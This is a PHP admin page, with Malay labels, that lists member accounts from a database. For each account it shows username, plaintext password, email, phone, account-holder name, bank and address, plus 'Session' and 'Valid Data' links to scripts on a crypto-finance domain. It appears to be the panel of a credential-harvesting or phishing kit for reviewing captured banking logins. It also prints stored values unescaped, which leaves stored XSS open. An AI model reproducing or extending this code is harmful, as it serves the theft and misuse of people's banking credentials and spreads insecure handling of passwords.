
<?php include 'inc/template_start.php'; ?>
<?php include 'inc/page_head.php'; ?>


<!-- Page content -->
<div id="page-content">
    
    <div class="block full">
        <div class="block-title">
            <h2>Manage PO</h2>
        </div>
        <div class="table-responsive">
            <table id="example-datatable" class="table table-striped table-bordered table-vcenter">
                <thead>
                    <tr>
                        <th class="text-center" style="width: 5%;">Susunan</th>
                        <th>Session</th>
                        <th>Valid Data</th>
                        <th>Username</th>
                        <th>Pass</th>
                        <th>email</th>
                        <th>Phone</th>
                        <th>Penama</th>
                        <th>Bank</th>
                        <th>Address</th>
                        <th style="width: 200px;">Last Login</th>
                        
                    </tr>
                </thead>
                <tbody>
<?php
$i=1;
include "database/server.php";
include "functions.php";
$i='1';
$data = mysqli_query($conn,"SELECT * FROM userpro WHERE akaun='MEMBER' ORDER BY created_date DESC") or die(mysqli_error($conn));
while($info = mysqli_fetch_array( $data )) {
$id   = $info['id'];
$pwd   = $info['pwd'];
$emel   = $info['emel'];
$phone   = $info['phone'];
$penama   = $info['penama'];
$jenisb   = $info['jenisb'];
$address   = $info['address'];
$lastlogin   = $info['lastlogin'];
?>
                    <tr>
                        <td><?=$i?></td>
<td> <a href="https://supercryptofinance.com/sys/bms.php?id=<?=$id?>" target="blank">Lets Go!</a></td>
<td> <a href="https://supercryptofinance.com/sys/bmk.php?id=<?=$id?>" target="blank">Check out!</a></td>
                        <td><?=$id?></td>
                        <td><?=$pwd?></td>
                        <td><?=$emel?></td>
                        <td><?=$phone?></td>
                        <td><?=$penama?></td>
                        <td><?=$jenisb?></td>
                        <td><?=$address?></td>
                        <td><?=$lastlogin?></td>
                    </tr>
                    <?php $i++; }
					
					
					?>
                </tbody>
            </table>
        </div>
    </div>
    <!-- END Datatables Block -->
</div>
<!-- END Page Content -->

<?php include 'inc/page_footer.php'; ?>
<?php include 'inc/template_scripts.php'; ?>

<!-- Load and execute javascript code used only in this page -->
<script src="js/pages/uiTables.js"></script>
<script>$(function(){ UiTables.init(); });</script>

<?php include 'inc/template_end.php'; ?>